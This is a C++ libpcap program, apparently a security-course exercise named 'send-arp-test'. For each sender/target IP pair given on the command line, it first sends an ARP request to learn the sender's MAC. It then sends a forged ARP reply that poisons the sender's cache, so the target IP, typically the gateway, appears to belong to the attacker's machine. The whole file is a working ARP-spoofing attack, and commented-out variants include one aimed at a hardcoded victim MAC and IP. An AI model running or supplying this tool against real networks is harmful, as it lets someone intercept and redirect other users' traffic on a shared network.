#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string>
#include <iostream>
#include <fstream>
#include <vector>
using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp-test wlan0 192.168.50.22 192.168.50.1\n");
}

bool get_my_mac(std::string & strMac, char* dev) {
	// https://m.blog.naver.com/websearch/221811963830
	unsigned char arrMac[6];
	char szMac[51];
	bool bRes = false;
	struct ifreq ifr;

	strMac.clear();

	int hSocket = socket( AF_INET, SOCK_DGRAM, IPPROTO_IP );
	if (hSocket == -1) return false;

	strcpy( ifr.ifr_name, dev );
	if ( ioctl( hSocket, SIOCGIFHWADDR, &ifr ) == 0 )
	{
		memcpy( arrMac, ifr.ifr_hwaddr.sa_data, sizeof(arrMac) );
		bRes = true;
	}

	close( hSocket );

	if( bRes )
	{
		snprintf( szMac, sizeof(szMac), "%02X:%02X:%02X:%02X:%02X:%02X", arrMac[0], arrMac[1], arrMac[2], arrMac[3], arrMac[4], arrMac[5] );
		strMac = szMac;
		return true;
	}

	return false;
}


bool get_my_ip(std::string & myip, char* dev) {
	int n;
    struct ifreq ifr;
 
    n = socket(AF_INET, SOCK_DGRAM, 0);
    //Type of address to retrieve - IPv4 IP address
    ifr.ifr_addr.sa_family = AF_INET;
    //Copy the interface name in the ifreq structure
    strncpy(ifr.ifr_name , dev , IFNAMSIZ - 1);
    ioctl(n, SIOCGIFADDR, &ifr);
	myip = inet_ntoa(( (struct sockaddr_in *)&ifr.ifr_addr )->sin_addr);
    close(n);
	return true;
}

void send_arp_packet_3(pcap_t* handle, char* dev, Mac* eth_dmac,
Mac* eth_smac, Mac* arp_smac, string* arp_sip, Mac* arp_tmac,
string* arp_tip, int mode) {
	EthArpPacket packet;

	packet.eth_.dmac_ = *eth_dmac;
	packet.eth_.smac_ = *eth_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	if (mode == 0) {
		packet.arp_.op_ = htons(ArpHdr::Request);
	}
	else {
		packet.arp_.op_ = htons(ArpHdr::Reply);
	}
	packet.arp_.smac_ = *arp_smac;
	packet.arp_.sip_ = htonl(Ip(*arp_sip));
	packet.arp_.tmac_ = *arp_tmac;
	packet.arp_.tip_ = htonl(Ip(*arp_tip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

/*
void send_arp_packet(pcap_t* handle, char* dev, string eth_dmac, string eth_smac,
string arp_smac, string arp_sip, string arp_tmac, string arp_tip,
int mode) {
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(eth_dmac);
	packet.eth_.smac_ = Mac(eth_smac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	if (mode == 0) {
		packet.arp_.op_ = htons(ArpHdr::Request);
	}
	else {
		packet.arp_.op_ = htons(ArpHdr::Reply);
	}
	packet.arp_.smac_ = Mac(arp_smac);
	packet.arp_.sip_ = htonl(Ip(arp_sip));
	packet.arp_.tmac_ = Mac(arp_tmac);
	packet.arp_.tip_ = htonl(Ip(arp_tip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

void send_arp_packet_2(pcap_t* handle, char* dev, Mac eth_dmac, string eth_smac,
string arp_smac, string arp_sip, Mac arp_tmac, string arp_tip,
int mode) {
	EthArpPacket packet;

	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.smac_ = Mac(eth_smac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	if (mode == 0) {
		packet.arp_.op_ = htons(ArpHdr::Request);
	}
	else {
		packet.arp_.op_ = htons(ArpHdr::Reply);
	}
	packet.arp_.smac_ = Mac(arp_smac);
	packet.arp_.sip_ = htonl(Ip(arp_sip));
	packet.arp_.tmac_ = arp_tmac;
	packet.arp_.tip_ = htonl(Ip(arp_tip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}
*/

void get_arp_packet(pcap_t* handle, char* dev, string eth_dmac, 
string eth_smac, Mac &arp_smac, string arp_sip, string arp_tmac, 
string arp_tip) {
	while(true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		struct EthHdr* ethp;
		struct ArpHdr* arpp;
		ethp = (struct EthHdr*) packet;
		arpp = (struct ArpHdr*) (packet + sizeof(struct EthHdr));
		if (ethp->type() != EthHdr::Arp) {
			continue;
		}
		if (arpp->sip() != Ip(arp_sip)
		|| arpp->tmac() != Mac(arp_tmac)
		|| arpp->tip() != Ip(arp_tip)) {
			continue;
		}
		arp_smac = arpp->smac();
		break;
	}
}

int main(int argc, char* argv[]) {
	if ((argc < 3) || (argc % 2 == 1)) {
		usage();
		return -1;
	}
	
	vector<string> sender_ip;
	vector<string> target_ip;

	for (int argv_idx = 2; argv_idx < argc; argv_idx++) {
		if (argv_idx % 2 == 0) {
			sender_ip.push_back(argv[argv_idx]);
		}
		else {
			target_ip.push_back(argv[argv_idx]);
		}
	}

	char* dev = argv[1];

	string mymac;
	bool ismac = get_my_mac(mymac, dev);

	string myip;
	bool isip = get_my_ip(myip, dev);

	Mac smac_m;
	Mac mymac_m = Mac(mymac);

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		exit(-1);
	}

	Mac allff = Mac("ff:ff:ff:ff:ff:ff");
	Mac all00 = Mac("00:00:00:00:00:00");
	for (int num = 0; num < (argc - 2) / 2; num++) {
		send_arp_packet_3(handle, dev, &allff, &mymac_m, &mymac_m, &myip,
	&all00, &sender_ip[num], 0);

	

	/*
	get_arp_packet(handle, dev, mymac, target_ip[0], smac_m, sender_ip[0],
	mymac, myip);

	send_arp_packet_2(handle, dev, smac_m, mymac, mymac, target_ip[0], smac_m, sender_ip[0], 1);
	}
	*/

	get_arp_packet(handle, dev, mymac, target_ip[num], smac_m, sender_ip[num],
	mymac, myip);

	send_arp_packet_3(handle, dev, &smac_m, &mymac_m, &mymac_m, &target_ip[num], &smac_m, &sender_ip[num], 1);
	}
	
	pcap_close(handle);

	/*
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("68:ec:c5:35:71:22");
	packet.eth_.smac_ = Mac(mymac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply); //ArpHdr::Request
	packet.arp_.smac_ = Mac(mymac);
	packet.arp_.sip_ = htonl(Ip(target_ip[0]));
	packet.arp_.tmac_ = Mac("68:ec:c5:35:71:22");
	packet.arp_.tip_ = htonl(Ip("192.168.197.86"));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
	*/
}
